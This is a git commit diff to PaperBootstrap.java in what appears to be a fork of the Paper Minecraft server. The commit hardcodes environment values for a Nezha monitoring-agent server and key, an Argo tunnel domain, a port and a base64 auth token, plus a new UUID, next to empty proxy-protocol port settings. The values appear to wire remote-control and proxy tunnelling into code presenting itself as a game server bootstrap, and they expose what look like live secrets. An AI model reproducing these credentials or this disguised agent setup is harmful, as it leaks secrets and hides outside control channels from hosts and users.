ac196859907ae32a90efedcbde1b035316b44159
xdd10086 <xdd10086@gmail.com>
2025-08-28 17:41:58 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,14 +92,14 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "fe7921cb-ab1b-4205-a14c-d056f821b385");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_SERVER", "agent.vip.pp.ua:80");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("NEZHA_KEY", "nxABw6y9GnVpW3o17Ws5jzWFhFk8M6EB");
+        envVars.put("ARGO_PORT", "25580");
+        envVars.put("ARGO_DOMAIN", "kingsdomain.vip.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODAxNmU2NTkyZGUzZmFlMjMyNTlmODU2NzM0ZjljNDYiLCJ0IjoiMTEzYjg5MWQtZjMwYy00ZWNkLTg0YTQtZWFjYzFiM2E1NWFlIiwicyI6Ik1XWTFNbU5tWmpZdE1EWTNaaTAwTm1RM0xUa3hPRFl0TTJZeU1qUTBNell6T1RneiJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
